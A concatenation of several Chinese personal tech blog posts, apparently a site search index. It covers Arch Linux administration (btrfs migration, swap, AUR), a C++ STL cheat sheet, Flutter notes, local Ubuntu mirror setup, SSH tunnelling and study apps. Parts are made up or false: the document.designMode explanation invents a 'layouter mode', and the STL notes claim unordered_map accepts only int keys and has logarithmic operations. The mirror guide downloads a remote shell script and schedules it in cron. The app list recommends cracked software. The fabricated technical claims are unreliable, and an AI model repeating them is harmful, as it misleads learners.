turn SysRq all the way on. 上边是arch wiki的资料链接，可以参考下开开这玩意。这玩意的快捷键可以这么记：Reboot Even If System Utterly Broken。用法就是Alt+SysRq+这六个单词首字母缩写，功能分别是 Unraw：切换键盘输入到ASCII模式， Terminate：给所有进程发送SIGTERM， Kill：发送SIGKILL给所有进程， Sync：写入数据到磁盘， Unmount：卸载然后挂载所有文件系统为只读模式， Reboot：重启。 另外还可以用f来触发OOM Killer。 开机时间优化 ref: 律回彼境 使用sudo systemd-analyze blame可以查看系统开机时间详情。 自动mount分区（也就是直接在/etc/fstab里边进行配置）会导致启动时间增大，所以更推荐写成一个脚本，在用户登录后自动执行挂载。脚本放置在 ~/.config/autostart/ 即可在用户登录后执行。 又被Firefox爆了 虽然后来看日志发现是Firefox被kwin爆了 这几天频繁出现桌面所有进程炸掉的情况，恢复后Firefox的Crash Report自己会跳出来。。不知道为啥，但是根据群u从about:crashes里边提交的崩溃报告来看，应该是kwin把Firefox爆了。 根据老哥的建议，关闭了系统的自适应同步（Adaptive Sync）选项，按照他的惊叹，问题可能会少一些。 传文件的姿势 什么姿势，还真没见过-转自archlinux-cn-依云 1tar C -c ~tmp/makepkg/wayfire-lily-git/src/build/src wayfire | ssh root@kvm-archkde tar xvU -C /usr/bin/ 文件系统迁移 有条件的话，建议还是全新安装最好。 Reference: 如何将你的文件系统转换为 Btrfs | Linux 中国 Linux_Personal_Note/Linux系统之rsync 备份与还原 - github.com 从ext4迁移到btrfs - imlk’s blog GRUB broken after conversion to btrfs - Superuser.com Boot on btrfs subvolume error: “mount: /new_root: unknown filesystem type ‘btrfs’ ” 参考了几个博客，跟着感觉走最后总算是有惊无险整好了。 本来是想用btrfs-convert给直接原地转换的，但是奈何superblock大小太小，转换失败。没办法，自己动手丰衣足食。 首先先是把原来的系统备份好： 1dd if=/dev/nvme0n1p5 of=/path/to/another/disk/backup.img bs=4M status=progress 有备份了，开整。 发现手边没有U盘，但是有个root的手机。于是就用DriveDroid+一个Arch的LiveISO让它发挥余热了。 启动挺顺利，记得把ArchISO挂载为只读USB存储设备。进去之后确保确实备份了之后格式化设备（一定要多确认几遍，）： 1mkfs.btrfs -L arch-driver /dev/nvme0n1p5 # 这里务必多确认几遍 然后创建子卷，布局我用的适合timeshift的默认方案： 12345678910mount -t btrfs -o compress=zstd /dev/nvme0n1p5 /mntbtrfs subvolume create /mnt/@ # 创建 / 目录子卷btrfs subvolume create /mnt/@home # 创建 /home 目录子卷umount /mntmount -t btrfs -o subvol=/@,compress=zstd /dev/nvme0n1p5 /mntmkdir /mnt/homemount -t btrfs -o subvol=/@home,compress=zstd /dev/nvme0n1p5 /mnt/homemkdir -p /mnt/bootmount /dev/nvme0n1p2 /mnt/boot 创建完成之后，准备迁移数据： 1234mkdir ~/old-fsmonut /path/to/your/backup/backup.img ~/old-fsrsync -av ~/old-fs/home/ /mnt/home/rsync -av --exclude={&quot;/proc&quot;,&quot;/dev&quot;} ~/old-fs/ /mnt/ 等复制完成之后，就可以着手修复系统引导了。这里先用iwctl连上网。之后就该开始修复GRUB了： 12345678genfstab -U /mnt &gt; /mnt/etc/fstab# 此时手动检查下结果是否正确# 可以cat /mnt/etc/fstab看看arch-chroot /mntpacman -S grub-btrfs # 安装支持btrfs版本的GRUBgrub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=ARCHsed -i 's/loglevel=3 quiet/loglevel=5 nowatchdog/g' /etc/default/grubecho &quot;GRUB_DISABLE_OS_PROBER=false&quot; &gt;&gt; /etc/default/grub 然后理论上就OK了。此时ctrl+d退出chroot然后umount -R /mnt &amp;&amp; reboot，重启，进入新系统看看吧。 反正解决完一堆问题，成功进系统之后，我惊悚地发现，磁盘可用空间从8G变成了30G而且btrfs balance /之后还又多出来1G。根据rx所说，btrfs对于文本的压缩效果特别好。那指不定是给我一堆node_modules压缩干净了？ 谁知道，大概是透明压缩确实顶吧。经过测试，timeshift和其他的btrfs特性都能正常使用。 在Btrfs上开启swap Ref: Btrfs文件系统启用交换文件(swap) - Pipci最近主力机寄了，无奈让另一台i5-7300U的本子当主力。开swap主要是因为8+256的配置实在有点吃不消,平时开几个VSCode跟浏览器标签页就差不多满内存了。 问题是之前用一般方法开启swap的时候总会在swapon这一步遇到问题，后来查了下才发现是btrfs上的交换文件有几个限制： 不支持在快照卷上配置交换文件，建议单独创建子卷 不支持在跨越多个物理设备的卷上创建交换文件 是的，我才知道btrfs是能跨硬盘组阵列的QAQ 所以流程是创建一个新的subvolume，然后设置上一些标记之后再创建swap文件，最后开启swap。 下面是来自我找到的博客的操作记录，在我的6.9.3的内核上验证基本没有问题： 注意，下面的操作在/下进行 12345678910111213141516171819202122232425262728# 创建swap子卷te@EY-B:/$ sudo btrfs subvolume create swapCreate subvolume './swap'# 在swap子卷下创建一个0 byte大小的交换文件te@EY-B:/swap$ sudo truncate -s 0 /swap/swapfile# 配置交换文件权限te@EY-B:/swap$ sudo chmod 600 /swap/swapfile # 配置交换文件属性，具有'C'属性集的文件将不受 copy-on-write 的约束。# 注意:对于btrfs，“C”标志应该是设置新的或空文件。te@EY-B:/swap$ sudo chattr +C /swap/swapfile # 配置btrfs禁止压缩交换文件te@EY-B:/swap$ sudo btrfs property set /swap compression none# 将交换文件填充至需要的大小te@EY-B:/swap$ sudo dd if=/dev/zero of=/swap/swapfile bs=1M count=2048# 格式化交换文件te@EY-B:/swap$ sudo mkswap /swap/swapfile # 启用交换文件te@EY-B:/swap$ sudo swapon /swap/swapfile# 编辑 /etc/fstab 自动挂载，添加或编辑以下行：sudo echo &quot;/swap/swapfile none swap sw 0 0&quot; &gt;&gt; /etc/fstab 完成之后重启，用free -h看看挂载结果： 继续苟一阵子吧…等考试周结束之后再想想怎么处理这个机革的本子毕竟是用40G内存+12700H带我用Arch爽了快一年的本子，还是挺有感情的就是这玩意刚过保4个月就寄实在是有点绷不住 aur的制作和发布aur就是archlinux user repo，借助PKGBUILD可以快速简单地编排应用的编译构建流程。如果遇到一个GitHub的项目，你就可以编写一个PKGBUILD来编排一个从源码编译出应用包的构建脚本。 这次我用python-etcpak-git作为例子来记录aur的制作和提交。 编写PKGBUILD注册AUR首先生成密钥，打开终端，输入ssh-keygen然后回车，按照提示生成公私钥。假设密钥名称保存为aur-key。 然后编辑~/.ssh/config，在末尾追加： 123Host aur.archlinux.org IdentityFile ~/.ssh/aur-key User aur 完成后，复制aur-key.pub的内容，开始注册账号。 在https://aur.archlinux.org注册登陆，正确填写邮，用户名和aur-key.pub的内容。完成后打开邮箱的密码重设链接设置密码，完成后即可发布自己的PKGBUILD到aur。 发布PKGBUILD 要是不确定可以参考arckwiki中的介绍，将自己的PKGBUILD挂到邮件列表/论坛内，让大火帮你检查。 我要发布的软件包叫python-etcpak-git，那么就是使用下面的指令初始化仓库： 1git clone ssh://aur@aur.archlinux.org/python-etcpak-git.git 完成后，进入该目录并放置自己的PKGBUILD文件，按照要求填写后，生成信息： 1makepkg --printsrcinfo &gt; .SRCINFO 最后将PKGBUILD和.SRCINFO添加到git中，提交。**不过记得先更改本地分支名为master**，因为aur只允许推送到master分支。完成后推送，请坐和放宽，过阵子应该就能用yay安装你的包了。 PKGBUILD笔记makepkg(8) — Arch manual pagesmakepkg.conf(5) — Arch manual pagesmakepkg - Arch Linux 中文维基 makepkg可以使用一些额外的环境变量参数和一些cli参数： MAKEFLAGS 指定传递给make的参数 CHOST 指定交叉编译的–host参数 wechat-uos分辨率问题 ref: Arch 上使用微信原生版本 123sudo vim /usr/share/applications/wechat-universal.desktop# 修改Exec行为下列内容Exec=env QT_AUTO_SCREEN_SCALE_FACTOR=2 wechat-universal %u linux进程资源管理util-linux：一组实用工具 systemd-run：便捷地限制进程资源 Here’s how you can use systemd-run to limit CPU and memory usage: Limit CPU usage:To limit CPU usage to 50% of one core, you can use the CPUQuota option:1systemd-run --scope --cpu-quota=50000 my_process The CPUQuota value is in microseconds and is relative to the available CPU time (100% being equal to one CPU core). Limit memory usage:To limit memory usage to 512MB, you can use the MemoryMax option:1systemd-run --scope --memory-max=512M my_process Here’s an example combining both CPU and memory limits:1systemd-run --scope --cpu-quota=50000 --memory-max=512M my_process Replace my_process with the actual command you want to run.Here’s what each option does: --scope: This creates a transient scope unit for the process. It’s a good choice for short-lived processes. --cpu-quota: Sets the CPU time limit for the process. The value is in microseconds and is relative to the available CPU time. --memory-max: Sets the maximum amount of memory the process can use.After running the command, systemd-run will print the name of the created scope unit, which you can use to monitor the resource usage or to clean up the unit after the process has finished.To monitor the CPU and memory usage of the process, you can use:1systemctl status &lt;scope-unit-name&gt; Replace &lt;scope-unit-name&gt; with the actual name of the scope unit that systemd-run printed out.To clean up the transient scope unit after the process has finished, you can use:1systemctl stop &lt;scope-unit-name&gt; Remember that systemd-run is part of systemd, and it might not be available or might have different options on systems that do not use systemd. syncSynchronize cached writes to persistent storage obs-虚拟摄像头从26.1版开始，OBS 支持 Linux 虚拟摄像机输出。要使用它，安装 v4l2loopback-dkms包，并将用户加入video组，还需要为已安装的内核安装适当的头文件包，如 linux-headers包 或 linux-lts-headers包，然后 OBS 中会出现_启动虚拟摄像机_按钮。如果v4l2loopback包中的内核模块尚未加载，OBS 会自动尝试加载它，并要求获得管理权限（使用 pkexec(1)）。","link":"/2023/09/05/arch-linux%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"title":"C++-STL速通","text":"C++用的比较少，最近准备试试CSP。于是就得赶紧学学STL。以前是用过，但是没咋记下来。 想查看所有std实体的话，使用下面的指令： 1apropos -r '^std' | vim - 关于apropos，它是LINUX系统中的一个命令，用来通过关键字查找定位手册页的名字和描述。 它相当于使用带有-k选项的man命令。 每个手册页里都有一个简短的描述。 apropos在这个描述中查找keyword。这是使用man 帮助文档的一个好工具。 分类 顺序式：vector, list, deque 1234567891011begin()end()rbegin()rend()front()back()erase()clear()push_back()pop_back()insert() Vector1#include &lt;vector&gt; 简而言之就是数组，但是优化过，缝合了诸如队列、栈一类的特性。 12345678vector&lt;int&gt; vec; // 声明一个空的vectorvector&lt;int&gt; vec(5);vector&lt;int&gt; vec(10, 1); // 大小为10, 初始值为1vector&lt;int&gt; vec(oldVec);vector&lt;int&gt; vec(oldVec.begin(), dolVec.begin()+3);int arr[5] = {1, 2, 3, 4, 5};vector&lt;int&gt; vec(arr, arr+5); // 用数组初始化vecvector&lt;int&gt; vec(&amp;arr[0], &amp;arr[5]); // 用数组初始化vec, 注意这里是超尾, 与end相对应 那么如果我希望直接在下标为5的位置直接放入这个3呢，那不是需要先往里塞入5个0才可以么？这种情况，我们就可以定义一下vector的长度，然后就可以当做数组一样用了 12vector&lt;int&gt; a(10);a[5] = 3; List1#include &lt;list&gt; 双向链表。因此并不支持随机访问。尾部插入元素效率很高。 123456789101112131415161718192021list&lt;int&gt; l;list&lt;int&gt; l(5); // 含有5个元素的list, 初始值为0list&lt;int&gt; l(10, 1); // 含有10个元素的list, 初始值为1list&lt;int&gt; l(oldL); // 复制构造list&lt;int&gt; l(oldL.begin(), oldL.end());int arr[5] = {1, 2, 3, 4, 5};list&lt;int&gt; l(arr, arr+5); // 用数组初始化listlist&lt;int&gt; l(&amp;arr[1], &amp;arr[5]); // 用数组初始化listlist.merge() // 合并两个listlist.remove()list.remove_if() // 按指定条件删除元素list.reverse() // 逆置list元素list.sort() // 排序list.unique() // 删除重复元素list.splice() // 从另一个 list 中移动元素// Most used functionspush_front() // vector 没有该函数pop_front() // vector 没有该函数 Deque1#include &lt;deque&gt; 双端队列。每个元素在内存上是连续的，类似vector，是它的升级版。它有高效的首尾插入/删除操作。实现方法相当于list和vector的折衷。 它支持随机访问和at()。 1234push_back()pop_back()push_front() // vector 没有该函数pop_front() // vector 没有该函数 关联式容器： map, unordered_map, multimap, unordered_multimap, set, unordered_set, multiset, unordered_multiset Map1#include &lt;map&gt; 一种基于红黑树的键值对数据结构。 1234567891011121314// 数据插入, 复杂度为 lognmap.insert({key, value});map[key] = value;// 移除, 复杂度为 lognmap.erase(key)// 搜索, 复杂度为 lognmap.find()map[key]map.count() // 返回匹配特定键的元素数量, 对数复杂度map.contains()map.equal_range()map.lower_bound()map.upper_bound() Unordered-Map1#include &lt;unordered_map&gt; 区别于前者使用红黑树实现，它使用哈希函数实现，因此元素无序。 注意，默认情况下，它只支持使用int作为键，其他类型是不合法的。 1234567891011121314// 数据插入, 复杂度为 lognmap.insert({key, value});map[key] = value;// 移除, 复杂度为 lognmap.erase(key)// 搜索, 复杂度为 lognmap.find()map[key]map.count() // 返回匹配特定键的元素数量, 对数复杂度map.contains()map.equal_range()map.lower_bound()map.upper_bound() Set1#include &lt;set&gt; set 是一个关键字集合, 其中的关键字 不可重复, 其底层采用红黑树实现, 因此集合中的元素是 有序 的, 在 set 容器上进行的搜索, 插入和移除等操作都是对数复杂度的. 特有操作： 123lower_bound() // 返回指向首个不小于给定键的元素的迭代器upper_bound() // 返回指向首个大于给定键的元素的迭代器erase_if() Stack123456#include &lt;stack&gt;stack&lt;int&gt; s;s.push(data);s.pop();s.top(); // get value of tops.empty() // judge whether stack is empty Reference StackOverflow - Where are the man pages for C++? [closed] forever97 百度百科 - apropos","link":"/2023/09/14/cpp-stl/"},{"title":"CSDN复制解禁","text":"省流不看：F12开发者工具终端执行document.designMode='on'。 原理嘛，就是利用浏览器的DOM启用设计模式来允许选择元素。关于DOM的详细介绍在下边： DOM简介在浏览器中，document对象是一个非常重要的对象，它代表了当前页面的文档。document.DesignMode属性是document对象的一个属性，它用于指定页面的设计模式。 设计模式主要有两种： 模式（常态）：页面在正常模式下运行，用户可以正常查看和操作页面元素。 layouter 模式（布局模式）：页面在 layouter 模式下运行，用户无法正常查看和操作页面元素，只能查看页面的布局和结构。 这两种设计模式主要用于开发者调试和测试网页布局。通常，开发者会在开发过程中将页面切换到 layouter 模式，以便更好地查看和调整页面布局。当开发完成后，页面会自动切换回正常模式。 在页面加载时，浏览器会自动设置document.DesignMode属性的值。开发者也可以通过 JavaScript 代码来修改这个属性的值，从而实现在不同设计模式之间的切换。 除了DesignMode属性之外，document对象还有许多其他的属性和方法，它们可以用来完成各种网页开发任务。例如： document.body：表示页面的主体部分，包含了所有的 HTML 元素。 document.title：表示页面的标题，通常显示在浏览器的标签页上。 document.getElementById()：通过元素的 ID 获取指定元素。 document.getElementsByClassName()：通过元素的类名获取指定元素集合。 document.getElementsByTagName()：通过元素的标签名获取指定元素集合。 document.querySelector()：通过 CSS 选择器获取指定元素。 document.querySelectorAll()：通过 CSS 选择器获取指定元素集合。 此外，document对象还提供了许多用于操作 DOM 的方法，如createElement()、appendChild()、removeChild()、insertBefore()等，以及用于处理事件的方法，如addEventListener()、removeEventListener()等。 总之，document对象是浏览器中最重要的对象之一，它为网页开发者提供了丰富的属性和方法，使得开发者可以更加方便地完成各种网页开发任务。","link":"/2023/10/12/csdn-copy/"},{"title":"Flutter速通指南","text":"2023 XDU-OSC Community - Presented with love by BenderBlog/SuperBart 借助Flutter，他重新实现了校内十分流行的工具软件电表，使得用iOS的同学也有了自己的电表可用。开源和Flutter带来的，对于开发工作的简化以及SuperBart的超级肝力都成为了它能迅速上架iOS并迅速迭代的原因。 原生的电表iOS版本使用了iOS Native开发，在开发效率上略低于先天统一了不同平台实现的Flutter。在运行效率上的提升在业务都相对比较简单的情况下并没有很显著的优势。 其实上面这点也是现在原生客户端开发面对的问题。原生带来了更细致入微的操作粒度，带来更极致的原生性能利用率的同时，对于开发者心智的负担要求很高，也对开发者的能力深入性和熟练度提出了很高的要求；应对这一点的解决方案，有使用Web技术统一全端（就是性能问题和资源利用率一直饱受诟病），也有使用像Flutter这样的混合跨平台框架。后者性能损失相对没那么严重，跨平台能力也相对不错，但是动态程序的本质让它对于低性能设备的友好度较低（比如现在的百度贴吧客户端就是Flutter客户端，面对长列表的加载等场景偶尔会出现崩溃等问题）。 开发效率和程序运行表现基本是一对负相关的参数，其中的取舍就是开发者需要考虑的问题。在程序开发领域，没有银弹。 SuperBart的讲座Flutter概要一套代码 (./lib), 多平台运行. android, windows, linux, ios等. 面向客户端 平台无关 上手简单 Flutter的开发语言是Dart，初见印象：Dart= JS/C++(语言友好度和性能上) + Java(代码风格上) + Dart VM Basic code formattldr Empty safety: type? means var is nullable This will trigger empty check, avoid npe late init Just like Kotlin Async Basic layouts Widget Text Warp Row-Column Container Basic scaffolds AppBar Action TItle TabBar Body BottomBar Network主要使用Flutter的Dio。不过我用http/http.dart更多。 开发笔记评价是Flutter这玩意搓东西真的快。 Flutter使用的dart语言，强类型和可写性平衡的挺舒服的。语法上，Dart算是JavaScript的继承，语法大差不差，改进了JavaScript混乱的类型系统，还封装了不少挺不错的语法特性，比如那个Future，用着还行。还有内置的高级数据结构之类的，用着挺省心。 不过写这东西，我好像很少单独注意语法层面的东西，一般都是定义个返回Widget的build函数完事。另外这语言比较像DSL，没见过别处有用这玩意的。 关于WebViewWidget这玩意比较坑的一点是它只支持Android和iOS平台，对于Windows/Linux/Web平台，这玩意都是不支持的。。 所以review同学的代码的时候，发现在我用Linux平台跑的时候报错了。搜了下才发现这问题。 不过也无所谓了，反正这玩意本来就只是在Android/iOS上跑的。 关于TextEditController声明一个文本框时，它会默认初始化一个TextEditController。如果你传递给它你定义的Controller，它就会使用你提供的而不是自己创建。另外特别注意，给TextField赋值这一项的行为不是常量表达式，不能在它和它的父结构中使用const关键字。 关于sqflite这玩意有大坑（关于平台兼容性上的）。反正我目前尝试之后发现要么支持Windows/Linux/Mac等桌面端，要么支持Android/iOS等移动端的SQLite使用。 关于ListView关于这个东西，得注意的就是嵌套使用。嵌套的子ListView，需要设置如下两个属性来避免滚定判定失效： 12shrinkWrap: true,physics: const NeverScrollableScrollPhysics(), 关于项目结构1234567891011121314151617181920212223lib/ |- models/ // Define your data entities here |- entity1.dart |- entity2.dart |- services/ // Implement background service here |- background_service.dart |- screens/ // Screens of your app |- screen1/ // Screen 1 related files |- screen1.dart |- screen1_bloc.dart // If you're using BLoC pattern |- screen2/ // Screen 2 related files |- screen2.dart |- screen2_bloc.dart // If you're using BLoC pattern |- settings/ // Settings related pages |- settings.dart |- sub_setting1.dart |- sub_setting2.dart |- widgets/ // Reusable widgets |- providers/ // Provider setup and providers for data and services |- app_provider.dart // Main provider setup |- data_provider.dart // Provider for CRUD actions on data entities |- service_provider.dart // Provider for background service |- main.dart // Entry point of the app 功能划分基本就这几块：UI，状态管理服务，数据实体，后台服务。代码嘛，能简洁点最好。 另外就我的开发经验而言，最好不要过早规范化工程化。早期过于强调规范和过程的收益是负的。 MISC Invalid kernel binary version 解决方法：清理flutter/bin/cache 下缓存。在Arch Linux下，通过pacman安装的flutter的缓存目录位于/usr/lib/flutter/bin/cache，可以用whereis命令找到。 Error fetching devices: XMLHttpRequest error. 在开发flutter web应用遇到的，项目使用了 1import 'package:http/http.dart' as http; 作为网络请求库。 我遇到的问题是因为跨域造成的，这个提示有很强的误导性： 后端设置一下跨域允许就好了。","link":"/2023/09/16/flutter-intro/"},{"title":"如何搭建一个本地镜像源","text":"最近好哥们沉迷pocketchip，但是苦于架构比较古老（ARM-V7a但是能跑Linux Mainline），所以镜像站特别稀少，只有个国外的站点还开着。所以嘛，闲着也是闲着，就打算自己搭建一个镜像站咯。 顺便还能好好玩玩那个ESXi服务器。毕竟现在就只跑了一个OpenWRT和一个Ubuntu Server，实在没利用起来（ 或许回头整个本地镜像源还能试试刷新一下Arch安装速度记录（逃 准备首先需要足够的硬盘空间和一个Linux计算机，以及差不多的网络环境。 然后是一些神秘妙妙工具：apache2, debmirror, gnupg, xz-utils, rsync(recommend) 开始首先，因为同步的数据量会比较大，所以建议使用一块单独的硬盘或者看具体情况分个区都行。硬盘处理好后，可以将它挂载到/mount/下，随后创建我们的镜像站仓库目录们。 12mkdir -p /mirror/debmirror/{amd64,keyring}mkdir -p /mirror/scripts # 各种镜像站工具脚本 随后安装GPG keyrnig： 1gpg --no-default-keyring --keyring /mirror/debmirror/mirrorkeyring/trustedkeys.gpg --import /usr/share/keyrings/ubuntu-archive-keyring.gpg 安装完成后，在Web服务器站点根目录创建符号链接： 12cd /var/www/htmlln -s /mirror/debmirror/amd64 ubuntu 在这之后，我们还需要配置debmirror才能实现自动同步upstream等功能。 123cd /mirror/scriptswget https://louwrentius.com/files/debmirroramd64.sh.txt -O debmirroramd64.sh chmod +x debmirroramd64.sh 接着修改脚本设置： 1234567export GNUPGHOME=/mirror/debmirror/mirrorkeyringrelease=focal,focal-security,focal-updates,focal-backports,jammy,jammy-security,jammy-updates,jammy-backportsserver=nl.archive.ubuntu.comproto=rsyncoutPath=/mirror/debmirror/amd64#bwlimit=1000 # 设置rsync的带宽限速为1000KB/s，如果要启用这个限制，还需要取消注释下面的行：--rsync-options &quot;-aIL --partial --bwlimit=$bwlimit&quot; \\ 完成后，你可以先运行一次脚本来完成第一次同步。同步完成后，再在crontab里边加上自动任务（不然你的同步进程时间过长，可能会干扰cron任务）： 10 1 * * * /mirror/scripts/debmirroramd64.sh References Louwrentius - How to Setup a Local or Private Ubuntu MirrorDebian - Setting up a Debian archive mirror","link":"/2023/10/16/setup-local-linux-mirror/"},{"title":"SSH学习笔记","text":"文章是我和GPT一块写的，回头再慢慢丰富润色。 OpenSSH是一种强大的远程登录和数据传输工具，也是SSH协议目前最流行的实现。它提供了许多安全功能，如数据加密、身份验证和会话完整性。安全性上，SSH能吊着明文传输的Telnet打。并且SSH的配置也相对容易，目前基本所有主流Linux发行版都默认安装了OpenSSH，Win10/11也自带了OpenSSH Cilent。 追求效率提升，首先需要看看日常重复次数最多的操作，然后试着优化——比如SSH，虽然每次只有1,2秒，但累积起来节省的时间也不少。配置好了基本能实现无感登陆那种程度，让你几乎忘掉这个环节，还是挺爽的。除了效率，提升点安全性也是挺好的：公网服务器改用密钥登陆，又无感又安全——只要密钥别丢。 基本用法远程登录基本格式： 1ssh [options] [username]@[hostname] [username] 是远程主机的用户名，[hostname] 是远程主机的主机名或 IP 地址。 [options] 是可选的参数，例如 -i 指定要使用的私钥文件，-L 指定要使用的本地端口转发，-R 指定要使用的远程端口转发等。 一般用的最多的是默认端口密码登陆： 1ssh username@hostname &lt;-p 22&gt; 后面的-p 22是缺省参数，可以不加。 不过密码登陆安全性并不太高，建议重要场合上密钥登陆。例如，用密钥文件 id_rsa 以用户 username 登录远程主机 example.com： 1ssh -i id-rsa username@example.com 密钥和公钥就像锁和钥匙一一对应，你可以用同一对公钥密钥登陆多个主机，不过显然不太安全。建议一对公密钥只用于一个服务器的登陆。 它们的创建很简单，使用 OpenSSH 自带的 ssh-keygen 命令即可： 123456789101112131415161718192021222324xeonds@ark-station:~$ ssh-keygen Generating public/private ed25519 key pair.Enter file in which to save the key (/home/xeonds/.ssh/id_ed25519): example-key # 指定公钥私钥保存在哪Enter passphrase (empty for no passphrase): # 指定私钥使用密码Enter same passphrase again: Your identification has been saved in example-keyYour public key has been saved in example-key.pubThe key fingerprint is:SHA256:tFoZLdZFg3HDMqGG6rC5jq+zysxClfBCUvffMYgS5GY xeonds@ark-stationThe key's randomart image is:+--[ED25519 256]--+| ...+ o** ||.o o o o =+o.o ||o o E + O =o || . * o = * o || + . S . || . = o ||. o . . ||*. . ||BX+ |+----[SHA256]-----+xeonds@ark-station:~$ ls | grep exampleexample-keyexample-key.pub 上面带.pub后缀的就是公钥，私钥是不带后缀的那个。创建完成之后，可以用 ssh-copy-id 把公钥传给你要登陆的服务器，把私钥妥善保管好： 1ssh-copy-id -i example-key.pub username@example.com 还可以用-p xxxx指定端口。传完之后就能用前面的指令登陆服务器了。但是这样也挺麻烦的对吧。你别急，还有办法：把下面的内容保存到你的~/.ssh/config文件中： 123456Host my-server HostName example.com User username Port 22 # 端口默认22的话可以不写 IdentityFile ~/.ssh/example-key # 指向你的密钥路径 PreferredAuthentications publickey # 指定优先使用公钥 现在就可以直接用下面的指令登陆了： 1ssh my-server 直接登陆，几乎无感。当然要是你给私钥设置密码了就得在登陆的时候再输入一遍密码。 不过跟现代计算机系统比起来，还是人参与的环节更加脆弱，最终还是得小心社工手段。 断开连接因为忘了断开另一个开发机的ssh连接导致我有几个端口一直被占用着，所以得想办法断开另一台机器的连接： 123w # 查看所有连接pkill -kill -t pts/x # 断开编号为x的连接pkill -9 -t pts/x # 和上边一样，不过是强制断联 不过不知道为啥好像远程shell的服务还活着，只能手动杀掉了。下次建议用tmux，省事省心。 传输文件OpenSSH 还提供了一种安全传输文件的方法，称为 SFTP（SSH 文件传输协议）。要使用 SFTP 传输文件，您需要使用以下命令： 1sftp [options] [username]@[hostname] 其中，[options] 是可选的参数，例如 -i 指定要使用的私钥文件，-L 指定要使用的本地端口转发，-R 指定要使用的远程端口转发等。[username] 是远程主机的用户名，[hostname] 是远程主机的主机名或 IP 地址。例如，如果您要使用密钥文件 id_rsa 将本地文件 file.txt 传输到远程主机 example.com，可以使用以下命令： 1sftp -i id_rsa example.com 高级用法1. 端口转发 ref:SSH命令的三种代理功能 - 韦易笑 OpenSSH 提供了一种称为端口转发的功能，允许您将本地端口与远程端口进行映射。这使得您可以在本地网络上使用远程服务，而无需将服务暴露给外部网络。要使用端口转发，您需要使用以下命令： 1ssh -L [local_port:]local_host [username]@[hostname] 其中，[local_port] 是本地端口的名称，local_host 是本地主机的名称或 IP 地址，[username] 是远程主机的用户名，[hostname] 是远程主机的主机名或 IP 地址。例如，如果您要将本地端口 8080 映射到远程主机的 SSH 服务（端口 22），可以使用以下命令： 1ssh -L 8080:localhost username@example.com 上面的指令就能很轻易实现基于xxx over SSH的内网穿透。举个例子，前面我配置好了我的服务器的ssh config，假设我的服务器配置项名为server，在局域网中有一台地址为1.14.5.14的Windows服务器，那么我就可以使用一行指令通过SSH跳转连接到这台Windows服务器的远程桌面： 1ssh -L 3389:1.14.5.14:3389 server -N &amp; rdesktop localhost 假设我的这台服务器server在层层内网中，需要经过多重跳板才能从公网进行访问，一般的远程桌面面对这种网络环境可能比较困难，但是对于上面的RDP over SSH，这种方法既能享受SSH的安全性，又能相对便利地进行访问——只要配置好这台server服务器的ProxyJump路径和登陆就行。 端口转发有三种方式，上边的-L是正向代理，也就是在本地启动端口，把本地的数据转发到远端。上面转发桌面的例子就是这样，把本地3389端口的RDP请求转发到了远端的3389端口，从而实现了从本地访问远程服务器所在局域网的计算机的需求。另外两种分别是反向代理-R和socks5代理-D。这个一般可以作为兜底方案，长期需求建议上服务器。 按照正向代理的思路，反向代理就是把远端端口的访问请求转发到本地的计算机上。比如访问一个公网计算机的1234端口，就可以通过-R启动反向代理将这个端口的请求转发到本地的任意端口（比如4514）从而将内网的某个服务映射到公网中。这一点特别适合临时给某个服务搭建一个预览平台。 另外就是socks5转发，可以直接点上边链接看原文，这种我还没用过就不做阐述了。 下面用指令总结下这几种代理方式： 1234567# 转发本地请求到远端，例如访问远程局域网的远程桌面ssh -L [本地主机所在局域网任意主机:端口]:[目标主机所在局域网任意主机:端口] 要连接的主机# 转发远端请求到本地，例如穿透本机某端口的服务到公网ssh -R [远端主机:端口]:[本地主机局域网任意主机:端口] 远端主机# 本地socks5代理，效果大概就是让远端主机成为自己1080端口的上网代理？# 完成之后，在浏览器代理设置里边设置代理为socks5，地址为localhost:1080就行ssh -D localhost:1080 远端主机 连接后执行一条指令后断开 直接在连接命令后边跟上要执行的指令就行。 在远程主机运行X程序 连接命令加上-X参数，然后主机就会开启X转发。用-x则是关闭X转发。没用过，不过看起来像是服务器上跑进程，本地跑GUI的做法？ 2. SSHFS安装sshfs之后，就可以用ssh的方式将远程的文件系统挂载到本地了。 1sudo sshfs -o allow_other,default_permissions xeonds@10.0.0.154:/home/xeonds /mnt/ark-station-breeze/ 例如上面的指令，我将局域网中一个机器的用户目录挂载到了当前目录下。","link":"/2023/09/25/ssh-usage/"},{"title":"学科工具集","text":"学科工具集数学工具 GeoGeBra：图形计算器 这个词来源于geometry（几何学）和algebra（代数学）的合成。它的名字就已经显示出了它的功能：连接数与形的桥梁。 GeoGeBra：科学计算器 和上面那个是一家。使用起来感觉不错，和图形计算器用起来已经很接近了。 GeoGeBra：CAS计算器 感觉和上面那个差不多？ GeoGeBra：几何学 和上面那几个是一家。用来做平面几何的图绰绰有余。界面设计很简洁，很MD，有很多能挖的东西。 GeoGeBra：3D 3D作图效果不错，运行起来也挺流畅。果然这家出的都是精品吗（感叹 几何画板5.06（已破解） 很经典一个软件了。用好了绝对效果拔群。 作业帮Lite7.1.5 作业帮本身不错，但是平时用不上的东西太多……这个修改版就简单多了，只有搜题一个核心功能。对于不想忍受毒瘤般原版和一堆乱七八糟的东西的同学很合适。不过安全起见，最好不要随便登录自己的账号哦。 HP Prime（模拟器） 又是一个计算器……不过这个是HP Prime图形计算器的安卓平台模拟器。功能有缺失，不过还是好东西。毕竟是图形计算器嘛。 其他推荐的工具嘛……Wolframe，python的manim​库，matlab，网易的超级计算器，photomath，微软数学等等都是一些很好的东西。具体还是得自己体验。 更多工具以后会慢慢挖的（咕 天文学工具 Stellarium + 便捷的天文学工具，看星星必备神器。 ISS Live 似乎是一个直播ISS的应用？需要搭梯子。 文科学习工具 有道词典国际版 国内很多软件似乎都是国际版比国内版良心（点名某度网盘）？ 古诗词典 很好用的工具。拿来背古诗词很方便（也可以试试小猿搜题的，也很好用）。 谷歌翻译 谷歌翻译，永远滴神（谷歌大法好 全历史 既好用，又良心的历史全方位探究工具（甚至可以拿来看古籍？）。 快快查汉语字典 这个修改版用起来很舒服，功能也很强。就是偶尔会出现找不到离线词典的情况。不过很好用就是了。 啊，对了，这东西还能拿来记成语。高中党福音（就是经常会忘记打开hhh） 物理学习工具 Physics 和名字一样，学物理的。功能挺丰富，MD设计风格深得我心，内容和质量也不错。更像是一个物理百科全书（就是深度比较深一些）。 Pocket Physics 